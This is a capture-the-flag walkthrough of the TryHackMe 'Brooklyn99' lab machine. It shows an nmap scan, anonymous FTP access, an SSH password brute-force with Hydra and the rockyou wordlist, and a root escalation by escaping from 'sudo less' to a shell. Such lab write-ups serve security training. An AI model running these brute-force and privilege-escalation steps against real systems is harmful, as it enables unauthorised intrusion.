## Brook Lyn Nine Nine

<h3>Link MV: <a href="https://tryhackme.com/room/brooklynninenine" target="_blank">Brooklyn99</a></h3>

<h3>Difficulty: <img src="https://img.shields.io/badge/Very%20easy-green?style=flat-square"> </h3>

### *Leer el documentro en Español* <a href="BrookLynNineNine.md">Brook Lyn Nine Nine en Español</a>

## Description of the attack 

We start with a port scan using the Nmap tool:

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 10.10.153.79
```
<p align="center"> 
<img src="Images/Escaneo_con_nmap.png" width="600" alt="Resultado de Nmap">
</p>

We check that ports 21 (ftp), 22 (ssh) and port 80 (http) are open.

**On port 21, if we look, the anonymous user is available, whenever we have this user the password will be empty**

So let's investigate what the ftp service has:

```
ftp 10.10.153.79
```
<p align="center"> 
<img src="Images/notes_to_jake.png" width="600" alt="notes_to_jake">
</p>

We see that there is a .txt, we will try to download it with the following command:
```
get note_to_jake.txt
```
<p align="center"> 
<img src="Images/Descarga.png" width="600" alt="notes_to_jake">
</p>

We look at its content

```
cat note_to_jake.txt
```
<p align="center"> 
<img src="Images/Contenido_del_txt.png" width="600" alt="notes_to_jake">
</p>

From this we can conclude that the user is **jake** and they are warning him that the password is weak. Previously, with nmap, we discovered port 22 open (ssh), so let's brute-force it with **Hydra**

```
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.153.79 
```
<p align="center"> 
<img src="Images/Hydra.png" width="600" alt="notes_to_jake">
</p>

We enter ssh with the user **jake** and the password **987654321**

```
ssh jake@10.10.153.79
```
<p align="center"> 
<img src="Images/ssh.png" width="600" alt="notes_to_jake">
</p>

Once inside, to obtain the first red flag we would do the following:

```
cd /home/holt
ls
cat user.txt
```
<p align="center"> 
<img src="Images/1redflag.png" width="600" alt="notes_to_jake">
</p>

### Escalation of privilege

Whenever we perform privilege escalation, the first thing to try is the following command:

```
sudo -l
```

<p align="center"> 
<img src="Images/sudol.png" width="600" alt="notes_to_jake">
</p>

We see that **less** has permission to run as sudo, so we go to the following page <a href="https://gtfobins.github.io" target="_blank">gtfobins</a>

In the search engine we write **less** and then, we go to the sudo section

<p align="center"> 
<img src="Images/less.png" width="600" alt="notes_to_jake">
</p>

And we enter these commands in the terminal:

```
sudo /usr/bin/less /etc/profile
!/bin/sh
```
<p align="center"> 
<img src="Images/Escalada_privilegio.png" width="600" alt="notes_to_jake">
</p>

Now being root, we can execute the following commands:

```
cd /root
cat root.txt
```
<p align="center"> 
<img src="Images/2redflag.png" width="600" alt="notes_to_jake">
</p>

We got the last red flag which is the one for the root user

**Finished machine**